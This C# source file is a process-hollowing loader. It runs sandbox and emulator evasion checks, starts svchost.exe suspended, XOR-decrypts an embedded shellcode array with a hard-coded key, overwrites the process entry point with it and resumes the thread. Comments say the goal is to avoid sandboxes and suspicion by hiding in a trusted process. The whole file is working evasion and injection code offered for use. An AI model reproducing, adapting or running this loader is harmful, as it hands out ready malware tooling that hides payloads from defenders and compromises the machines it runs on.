using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace Hollow
{
    class Program
    {
        static void Main()
        {
            //Sleep to avoid sandbox environments
            DateTime t1 = DateTime.Now;
            var sleepParameters = new object[]
            {
                (uint)5000
            };

            Generic.DynamicApiInvoke("kernel32.dll", "Sleep", typeof(Win32.Sleep), ref sleepParameters);

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 4.69)
            {
                Console.WriteLine("Exiting as sleep wasn't met...");
                return;
            }

            var getCurrentProcParameters = new object[] { };
            var vaexParameters = new object[]
            {
                Generic.DynamicApiInvoke("kernel32.dll", "GetCurrentProcess", typeof(Win32.GetCurrentProcess), ref getCurrentProcParameters), IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40, (uint)0
            };

            IntPtr veax = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "VirtualAllocExNuma", typeof(Win32.VirtualAllocExNuma), ref vaexParameters);

            if (veax == null)
            {
                return;
            }

            var flsParameters = new object[]
            {
                IntPtr.Zero
            };

            IntPtr fls = (IntPtr)Generic.DynamicApiInvoke("kernel32.dll", "FlsAlloc", typeof(Win32.FlsAlloc), ref flsParameters);

            if (fls == null)
            {
                return;
            }

            string k = "flareon223";

            // Place encrypted shellcode here
            // Obtain by running encryption.py with the same key as above
            byte[] encBytes = new byte[] { 0x9a, 0x24, 0xe2, 0x96, 0x95, 0x87, 0xae, 0x32, 0x32, 0x33, 0x27, 0x3d, 0x20, 0x22, 0x37, 0x3e, 0x38, 0x7a, 0x3, 0xe1, 0x3, 0x24, 0xea, 0x20, 0x5, 0x27, 0xe5, 0x60, 0x2a, 0x7b, 0xed, 0x3e, 0x41, 0x3a, 0xee, 0x1d, 0x3e, 0x7a, 0x3d, 0x84, 0x2c, 0x26, 0x2c, 0x43, 0xac, 0x27, 0x5f, 0xf2, 0x9e, 0xf, 0x7, 0x10, 0x63, 0x5e, 0x45, 0x2e, 0xaf, 0xfb, 0x3f, 0x72, 0x67, 0xad, 0x83, 0x9f, 0x37, 0x2e, 0x3f, 0x7a, 0xb9, 0x61, 0x46, 0xe7, 0x23, 0x4e, 0x2d, 0x6e, 0xbe, 0xb9, 0xb2, 0xbb, 0x66, 0x6c, 0x61, 0x3a, 0xe0, 0xaf, 0x1a, 0x55, 0x7a, 0x32, 0xb6, 0x3c, 0xea, 0x3a, 0x7d, 0x2b, 0xe5, 0x72, 0x12, 0x7a, 0x67, 0xbc, 0x82, 0x24, 0x2d, 0x90, 0xa7, 0x73, 0xb9, 0x7, 0xee, 0x24, 0x60, 0xa4, 0x28, 0x5e, 0xa7, 0x7a, 0x3, 0xf3, 0xca, 0x2d, 0xa0, 0xbb, 0x68, 0x2e, 0x6f, 0xf3, 0xa, 0xd3, 0x13, 0x9d, 0x2d, 0x71, 0x29, 0x4b, 0x66, 0x77, 0xb, 0xe2, 0x13, 0xb4, 0x39, 0x36, 0xee, 0x2f, 0x4a, 0x7b, 0x33, 0xe3, 0x0, 0x2d, 0xea, 0x7e, 0x2d, 0x2b, 0xe5, 0x72, 0x2e, 0x7a, 0x67, 0xbc, 0x20, 0xf9, 0x61, 0xe7, 0x26, 0x33, 0xe2, 0x72, 0x3e, 0x2d, 0x39, 0x2c, 0x3c, 0x35, 0x2f, 0x6a, 0x73, 0x6a, 0x27, 0x36, 0x29, 0xf1, 0x89, 0x4f, 0x2f, 0x60, 0xcd, 0xd3, 0x3e, 0x2d, 0x38, 0x28, 0x2d, 0xe4, 0x7c, 0xdb, 0x65, 0xcc, 0x99, 0x93, 0x3c, 0x3a, 0xdf, 0x6e, 0x6e, 0x32, 0x32, 0x33, 0x66, 0x6c, 0x61, 0x3a, 0xe8, 0xe2, 0x6f, 0x33, 0x32, 0x33, 0x27, 0xd6, 0x50, 0xf9, 0xa, 0xe8, 0x91, 0xe7, 0x89, 0xc3, 0xd3, 0xce, 0x37, 0x33, 0xdf, 0xc9, 0xfb, 0x8f, 0xaf, 0xcc, 0xb3, 0x24, 0xe2, 0xb6, 0x4d, 0x53, 0x68, 0x4e, 0x38, 0xb3, 0x9d, 0x8c, 0x14, 0x77, 0xde, 0x28, 0x7d, 0x40, 0x5d, 0x59, 0x66, 0x35, 0x20, 0xfb, 0xbf, 0x90, 0xbb, 0x51, 0x53, 0x5f, 0x5, 0x42, 0x4, 0xa, 0x0, 0x6f };
            //Create objects of startup info and process info, as stated in the structures in the Win32.cs file
            Win32.STARTUPINFO si = new Win32.STARTUPINFO();
            Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
            var pa = new Win32.SECURITY_ATTRIBUTES();
            var ta = new Win32.SECURITY_ATTRIBUTES();

            si.cb = Marshal.SizeOf(si);
            pa.nLength = Marshal.SizeOf(pa);
            ta.nLength = Marshal.SizeOf(ta);

            var createProcessParameters = new object[]
            {
                "C:\\Windows\\System32\\svchost.exe", null, pa, ta, false, (uint)0x00000004 , IntPtr.Zero, "C:\\Windows\\System32", si, pi
            };

            //Create a suspended process of svchost.exe
            bool cpCheck = (bool)Generic.DynamicApiInvoke("kernel32.dll", "CreateProcessW", typeof(Win32.CreateProcessW), ref createProcessParameters);

            if (cpCheck == true)
            {
                pi = (Win32.PROCESS_INFORMATION)createProcessParameters[9];
                Console.WriteLine("[*] Created svchost.exe process successfully! PID: {0}", pi.dwProcessId);
            }
            else
            {
                Console.WriteLine("[!] There was an error creating svchost.exe!");
            }


            Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
            IntPtr hProcess = pi.hProcess;
            uint tmp = 0;
            var address = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            var zwQueryInformationProcess = (Win32.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.ZwQueryInformationProcess));

            int res = zwQueryInformationProcess(
                hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp
                );

            if (res == 0)
            {
                Console.WriteLine("[*] Got process information using ZwQueryInformationProcess...");
            }
            else
            {
                Console.WriteLine("[!] Failed to get process information using ZwQueryInformationProcess :(");
                return;
            }

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            var rpmAddress = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            var readProcessMemory = (Win32.ReadProcessMemory)Marshal.GetDelegateForFunctionPointer(rpmAddress, typeof(Win32.ReadProcessMemory));

            var r1 = readProcessMemory(
                    hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead
                );

            if (!r1)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the first try :(");
                return;
            }

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine($"[*] Obtained base of svchost.exe (0x{svchostBase.ToString("x")})");

            byte[] data = new byte[0x200];

            var r2 = readProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            if (!r2)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the second try :(");
                return;
            }

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            // Add the address of svchost base to the entry point calculated by adding the offset of the optional header to our base data address
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine($"[*] Found address of Entry Point (0x{addressOfEntryPoint.ToString("x")})");

            // Decryption Routine
            for (int i = 0; i < encBytes.Length; i++) {

                encBytes[i] = (byte)(encBytes[i] ^ k[i % k.Length]);
            }
            
            //Write shellcode into the processes execution instructions
            var writeProcMemParameters = new object[]
            {
                hProcess, addressOfEntryPoint, encBytes, encBytes.Length, nRead
            };
            var writeCheck = (bool)Generic.DynamicApiInvoke("kernel32.dll", "WriteProcessMemory", typeof(Win32.WriteProcessMemory), ref writeProcMemParameters);

            if (!writeCheck)
            {
                Console.Write("[!] Failed to write to remote svchost process!");
                return;
            }
            else
            {
                Console.WriteLine("[*] Performed remote process write into svchost...");
            }

            //Since the thread is suspended, we resume rather than execute it
            //Hopefully avoids suspicion more than previous methods, as this is a trusted process that communicates over networks regularly
            var resThreadParameters = new object[]
            {
                pi.hThread
            };

            uint resumeCheck = (uint)Generic.DynamicApiInvoke("kernel32.dll", "ResumeThread", typeof(Win32.ResumeThread), ref resThreadParameters);
            if (resumeCheck > 1)
            {
                Console.WriteLine($"[!] Failed to resume the thread! It is still suspended! Returned value: {resumeCheck}!");
                return;
            }
            else if (resumeCheck == 0)
            {
                Console.WriteLine($"[!] No idea how we got here. Thread appears to have not been suspended in the first place! Returned value: {resumeCheck}");
            }
            else
            {
                Console.WriteLine($"[*] Resumed thread successfully! Returned value: {resumeCheck}!");
            }
        }
    }
}